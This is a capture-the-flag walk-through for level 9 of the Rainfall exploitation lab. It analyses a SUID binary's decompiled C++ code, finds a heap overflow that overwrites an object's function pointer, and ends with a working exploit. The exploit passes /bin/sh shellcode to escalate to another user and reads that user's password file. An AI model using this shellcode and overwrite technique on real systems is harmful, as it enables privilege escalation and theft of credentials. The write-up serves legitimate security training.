# Walk-through Level9

## Introduction
Level9 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level9@RainFall:~$ checksec --file level9 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level9
```
**Key observations:**
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.

### Analyzing `level9`

After running the command `ls -l level9`, we observe the following output:

```
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

From this output, we can see that the binary `level9` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`bonus0`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `bonus0` user.

## **Debugging**  

```
level9@RainFall:~$ ./level9 
level9@RainFall:~$ ./level9 hello world
level9@RainFall:~$ ./level9 `python -c 'print("A" * 120)'`
Segmentation fault (core dumped) 
```

After running `./level9`, we noticed that:  

1. Running the binary without arguments produces no visible output.  
2. Running it with a simple string (`hello world`) also does not show anything unusual.  
3. However, when providing an input of 120 characters (`"A" * 120`), the program crashes with a **segmentation fault**.  


Since the program crashes with a segmentation fault, this suggests a **buffer overflow vulnerability**. To investigate further, we will:  

- decompile this binary using **Dogbolt** to understand its logic.
## **Code Analysis**

The relevant functions are:

### **1. `setAnnotation` function**
```c
void *__cdecl N::setAnnotation(N *this, char *s)
{
  size_t v2; // eax

  v2 = strlen(s);
  return memcpy((char *)this + 4, s, v2);
}
```
- This function **copies the user input (`s`)** into an object **without checking the size**, leading to **buffer overflow**.

### **2. `N` Constructor**
```c
void __cdecl N::N(N *this, int a2)
{
  *(_DWORD *)this = off_8048848;
  *((_DWORD *)this + 26) = a2;
}
```
- The constructor initializes an **object `N`** and sets its **first 4 bytes** (`*this`) to a function pointer (`off_8048848`).
- It also **stores an integer (`a2`) at an offset of 26 DWORDs (104 bytes).**

### **3. `main` function**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  N *v3; // ebx
  N *v4; // ebx
  N *v6; // [esp+1Ch] [ebp-8h]

  if ( argc <= 1 )
    _exit(1);

  v3 = (N *)operator new(0x6Cu);
  N::N(v3, 5);
  v6 = v3;
  
  v4 = (N *)operator new(0x6Cu);
  N::N(v4, 6);
  
  N::setAnnotation(v6, (char *)argv[1]);

  return (**(int (__cdecl ***)(N *, N *))v4)(v4, v6);
}
```
### Finding the Vulnerability
The key vulnerability is in:
- **The user input is written at offset 4 of `v3`**.
- Since `v3` is **108 bytes**, providing **more than 104 bytes** allows us to overwrite the **function pointer stored in `v4`**.
- This enables **arbitrary code execution**.
```
void *__cdecl N::setAnnotation(N *this, char *s)
{
  size_t v2; // eax

  v2 = strlen(s);
  return memcpy((char *)this + 4, s, v2);
}
```
#### What We Know
1. The program **expects at least one argument**.
2. It **allocates two objects (`v3` and `v4`)** using `operator new(0x6Cu)`, meaning each object is **108 bytes in size**.
3. The first allocated object **`v3`** is passed to `setAnnotation`, which **copies user input** into it **without size checks**.
4. The program **calls a function pointer stored in `v4`**, which **could be controlled if we overwrite it**.

## Proof-of-Concept (Working Exploit) 
``` bash
level9@RainFall:~$ ./level9 `python -c 'print("\x0c\xa0\x04\x08"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08")'`
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```